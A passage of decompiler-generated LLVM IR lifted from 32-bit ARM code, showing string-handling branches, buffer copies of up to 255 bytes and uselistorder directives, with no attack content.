  %v2_9ba4 = inttoptr i32 %v2_9ba0 to i8*
  %v3_9ba4 = call i32 @function_1234c(i8* %v2_9ba4, i32 ptrtoint (i32* @global_var_197c0.51 to i32))
  store i32 %v3_9ba4, i32* %r0.global-to-local, align 4
  %v0_9ba8 = load i32, i32* @r5, align 4
  %v1_9ba8 = add i32 %v0_9ba8, 3
  store i32 %v1_9ba8, i32* @r5, align 4
  %v0_9bac = load i32, i32* @sl, align 4
  %v1_9bac = add i32 %v0_9bac, 660
  %v2_9bac = inttoptr i32 %v1_9bac to i32*
  %v3_9bac = load i32, i32* %v2_9bac, align 4
  %v0_9bb0 = load i32, i32* @r7, align 4
  %v2_9bb0 = add i32 %v0_9bb0, %v1_9ba8
  store i32 %v2_9bb0, i32* @r6, align 4
  %v2_9bb4 = sub i32 %v3_9bac, %v1_9ba8
  store i32 %v2_9bb4, i32* %r1.global-to-local, align 4
  %v0_9bb8 = load i32, i32* @r8, align 4
  store i32 %v0_9bb8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197bc.48 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9bb0, i32* %r0.global-to-local, align 4
  %v4_9bc4 = call i32 @function_123dc(i32 %v2_9bb0, i32 %v2_9bb4, i32 ptrtoint (i32* @global_var_197bc.48 to i32), i32 %v0_9bb8)
  store i32 %v4_9bc4, i32* %r0.global-to-local, align 4
  %v0_9bc8 = load i32, i32* @sl, align 4
  %v1_9bc8 = add i32 %v0_9bc8, 16
  %v2_9bc8 = inttoptr i32 %v1_9bc8 to i32*
  %v3_9bc8 = load i32, i32* %v2_9bc8, align 4
  %v1_9bcc = and i32 %v3_9bc8, 33554432
  %v2_9bcc = icmp ne i32 %v1_9bcc, 0
  store i1 %v2_9bcc, i1* %cpsr_c.global-to-local, align 1
  %v3_9bcc = mul i32 %v3_9bc8, 128
  %v0_9bd0 = load i32, i32* @r5, align 4
  %v2_9bd0 = add i32 %v0_9bd0, %v4_9bc4
  %v1_9bd4 = add i32 %v3_9bcc, 1472
  %v0_9bd8 = load i32, i32* @sb, align 4
  %v2_9bd8 = add i32 %v1_9bd4, %v0_9bd8
  store i32 %v2_9bd8, i32* @r4, align 4
  %v2_9bdc = add i32 %v2_9bd0, %v0_9bd8
  store i32 %v2_9bdc, i32* @r5, align 4
  store i32 %v2_9bd8, i32* %r0.global-to-local, align 4
  %v0_9be4 = load i32, i32* @fp, align 4
  %v1_9be4 = trunc i32 %v0_9be4 to i8
  %v3_9be4 = add i32 %v2_9bdc, 2115
  %v4_9be4 = inttoptr i32 %v3_9be4 to i8*
  store i8 %v1_9be4, i8* %v4_9be4, align 1
  %v1_9be8 = inttoptr i32 %v2_9bd8 to i8*
  %v2_9be8 = call i32 @function_12324(i8* %v1_9be8)
  %v0_9bec = load i32, i32* @r6, align 4
  store i32 %v0_9bec, i32* %r1.global-to-local, align 4
  %v0_9bf0 = load i32, i32* @r4, align 4
  %v2_9bf0 = add i32 %v0_9bf0, %v2_9be8
  store i32 %v2_9bf0, i32* @r0, align 4
  %v2_9bf4 = inttoptr i32 %v2_9bf0 to i8*
  %v3_9bf4 = call i32 @function_1234c(i8* %v2_9bf4, i32 %v0_9bec)
  store i32 %v3_9bf4, i32* %r0.global-to-local, align 4
  %v0_9bf8 = load i32, i32* @sl, align 4
  %v1_9bf8 = add i32 %v0_9bf8, 16
  %v2_9bf8 = inttoptr i32 %v1_9bf8 to i32*
  %v3_9bf8 = load i32, i32* %v2_9bf8, align 4
  %v1_9bfc = add i32 %v3_9bf8, 1
  store i32 %v1_9bfc, i32* %r3.global-to-local, align 4
  store i32 %v1_9bfc, i32* %v2_9bf8, align 4
  br label %dec_label_pc_9a00

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9a74, %bb196
  %v2_9c0c = phi i32 [ %v1_9a64, %bb196 ], [ %v2_9a88, %dec_label_pc_9a74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9c0c = inttoptr i32 %v2_9c0c to i8*
  store i8 0, i8* %v3_9c0c, align 1
  br label %dec_label_pc_9a9c

dec_label_pc_9c14:                                ; preds = %dec_label_pc_98e4
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9c20 = load i32, i32* @r6, align 4
  %v1_9c20 = add i32 %v0_9c20, 4
  %v2_9c20 = inttoptr i32 %v1_9c20 to i8*
  %v3_9c20 = load i8, i8* %v2_9c20, align 1
  %v4_9c20 = zext i8 %v3_9c20 to i32
  store i32 %v4_9c20, i32* %r3.global-to-local, align 4
  %v2_9c24 = icmp ugt i8 %v3_9c20, 114
  store i1 %v2_9c24, i1* %cpsr_c.global-to-local, align 1
  %v7_9c24 = icmp eq i8 %v3_9c20, 115
  store i1 %v7_9c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c24, label %bb201, label %.thread44

bb201:                                            ; preds = %dec_label_pc_9c14
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_9c14, %bb201
  %v3_9c34 = phi i32 [ 7, %dec_label_pc_9c14 ], [ 8, %bb201 ]
  %v1_9c38 = sub nsw i32 1, %v3_9c34
  %v1_9c3c = load i32, i32* @r7, align 4
  %v2_9c3c = add i32 %v1_9c3c, %v1_9c38
  store i32 %v2_9c3c, i32* %r2.global-to-local, align 4
  %v2_9c40 = add i32 %v3_9c34, %v0_9c20
  store i32 %v2_9c40, i32* %r1.global-to-local, align 4
  store i32 %v0_9c20, i32* %r0.global-to-local, align 4
  %v3_9c48 = inttoptr i32 %v0_9c20 to i8*
  %v4_9c48 = call i32 @function_153fc(i8* %v3_9c48, i32 %v2_9c40, i32 %v2_9c3c)
  store i32 %v4_9c48, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_9c58 = load i32, i32* @r5, align 4
  %v1_9c58 = load i32, i32* @r4, align 4
  %v2_9c58 = add i32 %v1_9c58, %v0_9c58
  %v3_9c58 = inttoptr i32 %v2_9c58 to i8*
  %v4_9c58 = load i8, i8* %v3_9c58, align 1
  %v6_9c58 = zext i8 %v4_9c58 to i32
  store i32 %v6_9c58, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_9c5c = icmp eq i8 %v4_9c58, 0
  store i1 %v9_9c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c5c, label %dec_label_pc_9c9c, label %dec_label_pc_9c64

dec_label_pc_9c64:                                ; preds = %.thread44
  %v2_9c64 = icmp ugt i8 %v4_9c58, 46
  store i1 %v2_9c64, i1* %cpsr_c.global-to-local, align 1
  %v7_9c64 = icmp eq i8 %v4_9c58, 47
  store i1 %v7_9c64, i1* %cpsr_z.global-to-local, align 1
  %v1_9c68 = load i32, i32* @r6, align 4
  br i1 %v7_9c64, label %bb202, label %dec_label_pc_9c70

bb202:                                            ; preds = %dec_label_pc_9c64
  store i32 %v1_9c68, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9d1c

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c64
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9c80

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c80
  %v2_9c78 = icmp ugt i8 %v4_9c8c, 46
  store i1 %v2_9c78, i1* %cpsr_c.global-to-local, align 1
  %v7_9c78 = icmp eq i8 %v4_9c8c, 47
  store i1 %v7_9c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c78, label %dec_label_pc_9d1c, label %dec_label_pc_9c80

dec_label_pc_9c80:                                ; preds = %dec_label_pc_9c78, %dec_label_pc_9c70
  %v0_9c80 = phi i32 [ %v1_9c80, %dec_label_pc_9c78 ], [ 0, %dec_label_pc_9c70 ]
  %v1_9c80 = add i32 %v0_9c80, 1
  store i32 %v1_9c80, i32* %r1.global-to-local, align 4
  store i32 %v10_82f0, i32* @ip, align 4
  store i32 %v1_9c80, i32* %stack_var_-44, align 4
  %v2_9c8c = add i32 %v1_9c80, %v1_9c68
  %v3_9c8c = inttoptr i32 %v2_9c8c to i8*
  %v4_9c8c = load i8, i8* %v3_9c8c, align 1
  %v6_9c8c = zext i8 %v4_9c8c to i32
  store i32 %v6_9c8c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c90 = icmp eq i8 %v4_9c8c, 0
  store i1 %v2_9c90, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9c8c, i32* %r2.global-to-local, align 4
  br i1 %v2_9c90, label %dec_label_pc_9c9c, label %dec_label_pc_9c78

dec_label_pc_9c9c:                                ; preds = %dec_label_pc_9c80, %.thread44, %dec_label_pc_9d1c
  %v0_9c9c = load i32, i32* @r6, align 4
  store i32 %v0_9c9c, i32* %r0.global-to-local, align 4
  %v1_9ca0 = inttoptr i32 %v0_9c9c to i8*
  %v2_9ca0 = call i32 @function_12324(i8* %v1_9ca0)
  store i32 %v2_9ca0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9ca4 = icmp eq i32 %v2_9ca0, 0
  store i1 %v2_9ca4, i1* %cpsr_z.global-to-local, align 1
  %tmp203 = icmp slt i32 %v2_9ca0, 1
  br i1 %tmp203, label %dec_label_pc_9cbc, label %dec_label_pc_9cac

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9c9c
  %v0_9cac = load i32, i32* @r6, align 4
  store i32 %v0_9cac, i32* %r0.global-to-local, align 4
  %v1_9cb0 = inttoptr i32 %v0_9cac to i8*
  %v2_9cb0 = call i32 @function_12324(i8* %v1_9cb0)
  store i32 %v2_9cb0, i32* %r0.global-to-local, align 4
  %v2_9cb4 = icmp ugt i32 %v2_9cb0, 126
  store i1 %v2_9cb4, i1* %cpsr_c.global-to-local, align 1
  %v7_9cb4 = icmp eq i32 %v2_9cb0, 127
  store i1 %v7_9cb4, i1* %cpsr_z.global-to-local, align 1
  %v7_9cb8 = icmp slt i32 %v2_9cb0, 128
  br i1 %v7_9cb8, label %dec_label_pc_9e6c, label %dec_label_pc_9cbc

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9cac, %dec_label_pc_9c9c, %dec_label_pc_9e6c
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9cc0 = load i32, i32* %stack_var_-44, align 4
  %v0_9cc4 = load i32, i32* @r6, align 4
  %v1_9cc4 = add i32 %v0_9cc4, 1
  store i32 %v1_9cc4, i32* @r5, align 4
  %v2_9cc8 = add i32 %v1_9cc4, %v3_9cc0
  store i32 %v2_9cc8, i32* %r0.global-to-local, align 4
  %v1_9ccc = inttoptr i32 %v2_9cc8 to i8*
  %v2_9ccc = call i32 @function_12324(i8* %v1_9ccc)
  store i32 %v2_9ccc, i32* %r0.global-to-local, align 4
  %v2_9cd0 = icmp ugt i32 %v2_9ccc, 254
  store i1 %v2_9cd0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cd0 = icmp eq i32 %v2_9ccc, 255
  store i1 %v7_9cd0, i1* %cpsr_z.global-to-local, align 1
  %v8_9cd4 = icmp sgt i32 %v2_9ccc, 255
  br i1 %v8_9cd4, label %dec_label_pc_991c, label %dec_label_pc_9cd8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9cbc
  %v0_9cd8 = load i32, i32* @sb, align 4
  %v1_9cdc = add i32 %v0_9cd8, 533
  store i32 %v1_9cdc, i32* @r4, align 4
  store i32 %v1_9cdc, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9ce8 = call i32 @function_123b8(i32 %v1_9cdc, i32 255)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9cf0 = load i32, i32* %stack_var_-44, align 4
  %v0_9cf4 = load i32, i32* @r5, align 4
  %v2_9cf4 = add i32 %v0_9cf4, %v3_9cf0
  store i32 %v2_9cf4, i32* %r0.global-to-local, align 4
  %v1_9cf8 = inttoptr i32 %v2_9cf4 to i8*
  %v2_9cf8 = call i32 @function_12324(i8* %v1_9cf8)
  store i32 %v2_9cf8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cfc = icmp eq i32 %v2_9cf8, 0
  store i1 %v2_9cfc, i1* %cpsr_z.global-to-local, align 1
  %tmp204 = icmp slt i32 %v2_9cf8, 1
  br i1 %tmp204, label %dec_label_pc_991c, label %dec_label_pc_9d04

dec_label_pc_9d04:                                ; preds = %dec_label_pc_9cd8
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d08 = load i32, i32* %stack_var_-44, align 4
  %v0_9d0c = load i32, i32* @r4, align 4
  store i32 %v0_9d0c, i32* @r0, align 4
  %v0_9d10 = load i32, i32* @r5, align 4
  %v2_9d10 = add i32 %v0_9d10, %v3_9d08
  store i32 %v2_9d10, i32* %r1.global-to-local, align 4
  %v2_9d14 = inttoptr i32 %v0_9d0c to i8*
  %v3_9d14 = call i32 @function_1234c(i8* %v2_9d14, i32 %v2_9d10)
  store i32 %v3_9d14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_991c

dec_label_pc_9d1c:                                ; preds = %dec_label_pc_9c78, %bb202
  %v2_9d20 = phi i32 [ %v1_9c68, %bb202 ], [ %v2_9c8c, %dec_label_pc_9c78 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9d20 = inttoptr i32 %v2_9d20 to i8*
  store i8 0, i8* %v3_9d20, align 1
  br label %dec_label_pc_9c9c

dec_label_pc_9d28:                                ; preds = %dec_label_pc_989c
  %v1_9d28 = add i32 %v0_9d28, 1
  store i32 %v1_9d28, i32* %ip.global-to-local, align 4
  %v2_9d2c = add i32 %v0_989c, %v1_9d28
  store i32 %v2_9d2c, i32* %r4.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 %v2_9d2c, i32* %r0.global-to-local, align 4
  store i32 %v1_9d28, i32* %stack_var_-44, align 4
  %v1_9d3c = inttoptr i32 %v2_9d2c to i8*
  %v2_9d3c = call i32 @function_12324(i8* %v1_9d3c)
  store i32 %v2_9d3c, i32* %r0.global-to-local, align 4
  %v0_9d40 = load i32, i32* %r4.global-to-local, align 4
  %v2_9d40 = add i32 %v0_9d40, %v2_9d3c
  store i32 %v2_9d40, i32* @r4, align 4
  %v1_9d44 = add i32 %v2_9d40, -1
  %v2_9d44 = inttoptr i32 %v1_9d44 to i8*
  %v3_9d44 = load i8, i8* %v2_9d44, align 1
  %v4_9d44 = zext i8 %v3_9d44 to i32
  store i32 %v4_9d44, i32* %r3.global-to-local, align 4
  %v2_9d48 = icmp ugt i8 %v3_9d44, 33
  store i1 %v2_9d48, i1* %cpsr_c.global-to-local, align 1
  %v7_9d48 = icmp eq i8 %v3_9d44, 34
  store i1 %v7_9d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d48, label %dec_label_pc_9d50, label %dec_label_pc_98a8

dec_label_pc_9d50:                                ; preds = %dec_label_pc_9d28
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d54 = load i32, i32* %stack_var_-44, align 4
  %v0_9d58 = load i32, i32* @r5, align 4
  %v2_9d58 = add i32 %v0_9d58, %v3_9d54
  store i32 %v2_9d58, i32* %r4.global-to-local, align 4
  store i32 %v2_9d58, i32* %r0.global-to-local, align 4
  %v1_9d60 = inttoptr i32 %v2_9d58 to i8*
  %v2_9d60 = call i32 @function_12324(i8* %v1_9d60)
  store i32 %v2_9d60, i32* %r0.global-to-local, align 4
  %v2_9d64 = add i32 %v2_9d58, %v2_9d60
  store i32 %v2_9d64, i32* @r4, align 4
  %v0_9d68 = load i32, i32* @r6, align 4
  %v1_9d68 = trunc i32 %v0_9d68 to i8
  %v3_9d68 = add i32 %v2_9d64, -1
  %v4_9d68 = inttoptr i32 %v3_9d68 to i8*
  store i8 %v1_9d68, i8* %v4_9d68, align 1
  br label %dec_label_pc_98a8

dec_label_pc_9d70:                                ; preds = %dec_label_pc_9910
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9d74 = load i32, i32* %stack_var_-44, align 4
  %v0_9d78 = load i32, i32* @r6, align 4
  %v1_9d78 = add i32 %v0_9d78, 1
  store i32 %v1_9d78, i32* @r5, align 4
  %v2_9d7c = add i32 %v1_9d78, %v3_9d74
  store i32 %v2_9d7c, i32* %r0.global-to-local, align 4
  %v1_9d80 = inttoptr i32 %v2_9d7c to i8*
  %v2_9d80 = call i32 @function_12324(i8* %v1_9d80)
  store i32 %v2_9d80, i32* %r0.global-to-local, align 4
  %v2_9d84 = icmp ugt i32 %v2_9d80, 254
  store i1 %v2_9d84, i1* %cpsr_c.global-to-local, align 1
  %v7_9d84 = icmp eq i32 %v2_9d80, 255
  store i1 %v7_9d84, i1* %cpsr_z.global-to-local, align 1
  %v8_9d88 = icmp sgt i32 %v2_9d80, 255
  br i1 %v8_9d88, label %dec_label_pc_991c, label %dec_label_pc_9d8c

dec_label_pc_9d8c:                                ; preds = %dec_label_pc_9d70
  %v0_9d8c = load i32, i32* @sb, align 4
  %v1_9d90 = add i32 %v0_9d8c, 533
  store i32 %v1_9d90, i32* @r4, align 4
  store i32 %v1_9d90, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9d9c = call i32 @function_123b8(i32 %v1_9d90, i32 255)
  store i32 %v10_82f0, i32* @ip, align 4
  %v3_9da4 = load i32, i32* %stack_var_-44, align 4
  %v0_9da8 = load i32, i32* @r5, align 4
  %v2_9da8 = add i32 %v0_9da8, %v3_9da4
  store i32 %v2_9da8, i32* %r0.global-to-local, align 4
  %v1_9dac = inttoptr i32 %v2_9da8 to i8*
  %v2_9dac = call i32 @function_12324(i8* %v1_9dac)
  store i32 %v2_9dac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9db0 = icmp eq i32 %v2_9dac, 0
  store i1 %v2_9db0, i1* %cpsr_z.global-to-local, align 1
  %tmp205 = icmp slt i32 %v2_9dac, 1
  br i1 %tmp205, label %dec_label_pc_991c, label %dec_label_pc_9db8

dec_label_pc_9db8:                                ; preds = %dec_label_pc_9d8c
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9dbc = load i32, i32* %stack_var_-44, align 4
  %v0_9dc0 = load i32, i32* @r4, align 4
  store i32 %v0_9dc0, i32* @r0, align 4
  %v0_9dc4 = load i32, i32* @r5, align 4
  %v2_9dc4 = add i32 %v0_9dc4, %v3_9dbc
  store i32 %v2_9dc4, i32* %r1.global-to-local, align 4
  %v2_9dc8 = inttoptr i32 %v0_9dc0 to i8*
  %v3_9dc8 = call i32 @function_1234c(i8* %v2_9dc8, i32 %v2_9dc4)
  store i32 %v3_9dc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_991c

dec_label_pc_9dd0:                                ; preds = %dec_label_pc_8498
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9dd4 = call i32 @function_11a94(i32 50)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v3_9de0 = call i32 @function_119d0(i32 50, i32* null)
  store i32 %v3_9de0, i32* %r1.global-to-local, align 4
  %v0_9de8 = load i32, i32* @r5, align 4
  %v1_9de8 = add i32 %v0_9de8, 20
  store i32 %v1_9de8, i32* @r0, align 4
  %v2_9dec = inttoptr i32 %v1_9de8 to i8*
  %v3_9dec = call i32 @function_1234c(i8* %v2_9dec, i32 %v3_9de0)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9df4 = call i32 @function_119f4(i32 50)
  store i32 %v1_9df4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9df8:                                ; preds = %dec_label_pc_8498, %dec_label_pc_9ed8, %dec_label_pc_9eac, %dec_label_pc_9e80, %dec_label_pc_9e40, %dec_label_pc_9dd0
  %v0_9df8 = load i32, i32* @r7, align 4
  store i32 %v0_9df8, i32* %r1.global-to-local, align 4
  %v0_9dfc = load i32, i32* @fp, align 4
  store i32 %v0_9dfc, i32* @r0, align 4
  %v2_9e00 = inttoptr i32 %v0_9dfc to i8*
  %v3_9e00 = call i32 @function_1234c(i8* %v2_9e00, i32 %v0_9df8)
  store i32 %v3_9e00, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r1.global-to-local, align 4
  %v0_9e08 = load i32, i32* @sb, align 4
  %v1_9e08 = add i32 %v0_9e08, 1
  store i32 %v1_9e08, i32* @sb, align 4
  %v0_9e0c = load i32, i32* @r5, align 4
  %v3_9e10 = icmp uge i32 %v1_9e08, %v0_839c
  store i1 %v3_9e10, i1* %cpsr_c.global-to-local, align 1
  %v9_9e10 = icmp eq i32 %v1_9e08, %v0_839c
  store i1 %v9_9e10, i1* %cpsr_z.global-to-local, align 1
  %v1_9e14 = add i32 %v0_9e0c, 3140
  store i32 %v1_9e14, i32* @r5, align 4
  br i1 %v9_9e10, label %dec_label_pc_9e1c, label %dec_label_pc_83cc

dec_label_pc_9e1c:                                ; preds = %dec_label_pc_9df8
  %v1_9e2c = add i32 %v2_83b0, 1452
  store i32 %v1_9e2c, i32* %r2.global-to-local, align 4
  %v2_9e30 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_9e30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_84f4.preheader

dec_label_pc_9e40:                                ; preds = %dec_label_pc_8498
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e44 = call i32 @function_11a94(i32 51)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v3_9e50 = call i32 @function_119d0(i32 51, i32* null)
  store i32 %v3_9e50, i32* %r1.global-to-local, align 4
  %v0_9e58 = load i32, i32* @r5, align 4
  %v1_9e58 = add i32 %v0_9e58, 20
  store i32 %v1_9e58, i32* @r0, align 4
  %v2_9e5c = inttoptr i32 %v1_9e58 to i8*
  %v3_9e5c = call i32 @function_1234c(i8* %v2_9e5c, i32 %v3_9e50)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e64 = call i32 @function_119f4(i32 51)
  store i32 %v1_9e64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9e6c:                                ; preds = %dec_label_pc_9cac
  %v0_9e6c = load i32, i32* @sb, align 4
  %v0_9e70 = load i32, i32* @r6, align 4
  store i32 %v0_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e6c, 789
  store i32 %v1_9e74, i32* @r0, align 4
  %v2_9e78 = inttoptr i32 %v1_9e74 to i8*
  %v3_9e78 = call i32 @function_1234c(i8* %v2_9e78, i32 %v0_9e70)
  store i32 %v3_9e78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cbc

dec_label_pc_9e80:                                ; preds = %dec_label_pc_8498
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9e84 = call i32 @function_11a94(i32 48)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v3_9e90 = call i32 @function_119d0(i32 48, i32* null)
  store i32 %v3_9e90, i32* %r1.global-to-local, align 4
  %v0_9e98 = load i32, i32* @r5, align 4
  %v1_9e98 = add i32 %v0_9e98, 20
  store i32 %v1_9e98, i32* @r0, align 4
  %v2_9e9c = inttoptr i32 %v1_9e98 to i8*
  %v3_9e9c = call i32 @function_1234c(i8* %v2_9e9c, i32 %v3_9e90)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9ea4 = call i32 @function_119f4(i32 48)
  store i32 %v1_9ea4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9eac:                                ; preds = %dec_label_pc_8498
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9eb0 = call i32 @function_11a94(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_9ebc = call i32 @function_119d0(i32 47, i32* null)
  store i32 %v3_9ebc, i32* %r1.global-to-local, align 4
  %v0_9ec4 = load i32, i32* @r5, align 4
  %v1_9ec4 = add i32 %v0_9ec4, 20
  store i32 %v1_9ec4, i32* @r0, align 4
  %v2_9ec8 = inttoptr i32 %v1_9ec4 to i8*
  %v3_9ec8 = call i32 @function_1234c(i8* %v2_9ec8, i32 %v3_9ebc)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9ed0 = call i32 @function_119f4(i32 47)
  store i32 %v1_9ed0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9ed8:                                ; preds = %dec_label_pc_8498
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9edc = call i32 @function_11a94(i32 49)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v3_9ee8 = call i32 @function_119d0(i32 49, i32* null)
  store i32 %v3_9ee8, i32* %r1.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r5, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 20
  store i32 %v1_9ef0, i32* @r0, align 4
  %v2_9ef4 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef4 = call i32 @function_1234c(i8* %v2_9ef4, i32 %v3_9ee8)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9efc = call i32 @function_119f4(i32 49)
  store i32 %v1_9efc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

; uselistorder directives
  uselistorder i32 %v2_9e30, { 1, 0 }
  uselistorder i32 %v1_9e2c, { 1, 0 }
  uselistorder i32 %v1_9e14, { 1, 0 }
  uselistorder i32 %v1_9d28, { 1, 0, 2 }
  uselistorder i8 %v4_9c8c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9c80, { 0, 2, 3, 1 }
  uselistorder i1 %v7_9c78, { 1, 0 }
  uselistorder i32 %v1_9c68, { 1, 0, 2 }
  uselistorder i1 %v7_9c64, { 1, 0 }
  uselistorder i1 %v9_9c5c, { 1, 0 }
  uselistorder i32 %v0_9c20, { 2, 1, 0, 3 }
  uselistorder i32 %v2_9bb0, { 1, 0, 2 }
  uselistorder i32 %v1_9ba8, { 1, 0, 2 }
  uselistorder i32 %v1_9b3c, { 0, 2, 1 }
  uselistorder i32 %v0_9b3c, { 0, 2, 1 }
  uselistorder i32 %v2_9ab0, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_9a90, { 1, 0 }
  uselistorder i8 %v4_9a88, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9a90, { 1, 0, 3, 2 }
  uselistorder i1 %v7_9a74, { 1, 0 }
  uselistorder i32 %v1_9a64, { 1, 0, 2 }
  uselistorder i1 %v7_9a60, { 1, 0 }
  uselistorder i32 %v0_9a20, { 2, 0, 1, 3 }
  uselistorder i32 %v3_99e4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_99c8, { 1, 0, 2 }
  uselistorder i32 %v4_99c0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_98d8, { 1, 0 }
  uselistorder i32 %v0_989c, { 1, 0 }
  uselistorder i32 %v0_9d28, { 1, 0 }
  uselistorder i1 %v7_9858, { 1, 0 }
  uselistorder i32 %v0_9840, { 1, 0 }
  uselistorder i32 %v2_9834, { 1, 0, 2 }
  uselistorder i32 %v1_9800, { 1, 0 }
  uselistorder i32 %v0_97e8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_9798, { 1, 0 }
  uselistorder i32 %v5_9794, { 1, 5, 4, 2, 3, 6, 0, 7, 8 }
  uselistorder i32 %v2_977c.v4_9764, { 1, 0, 2 }
  uselistorder i1 %v7_9740, { 1, 0 }
  uselistorder i32 %v1_9668, { 1, 0, 2 }
  uselistorder i32 %v1_9660, { 1, 0 }
  uselistorder i1 %v7_9648, { 1, 0 }
  uselistorder i32 %v5_9644, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_962c.v4_9614, { 1, 0, 2 }
  uselistorder i1 %v7_95f4, { 1, 0 }
  uselistorder i32 %v0_9538, { 1, 0 }
  uselistorder i32 %v0_9520, { 1, 0 }
  uselistorder i32 %v0_9524, { 1, 0 }
  uselistorder i32 %v1_94fc, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_94c8, { 1, 0 }
  uselistorder i1 %v7_9490, { 0, 2, 1 }
  uselistorder i32 %v1_94b4, { 1, 0 }
  uselistorder i32 %v3_94ac, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %v0_94a0, { 1, 0 }
  uselistorder i1 %v7_9414, { 1, 0 }
  uselistorder i32 %v5_9410, { 4, 3, 1, 2, 5, 0, 6, 7 }
  uselistorder i32 %v2_93f8, { 1, 0, 2 }
  uselistorder i32 %v2_93f4, { 1, 0, 2 }
  uselistorder i32 %v1_93e0, { 0, 2, 1 }
  uselistorder i32 %v4_93d8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_93a8, { 1, 0 }
  uselistorder i1 %v7_9340, { 1, 0 }
  uselistorder i32 %v5_933c, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9324.v4_930c, { 1, 0, 2 }
  uselistorder i1 %v7_92dc, { 1, 0 }
  uselistorder i1 %v7_9268, { 1, 0 }
  uselistorder i32 %v5_9264, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_924c.v4_9234, { 1, 0, 2 }
  uselistorder i1 %v7_9210, { 1, 0 }
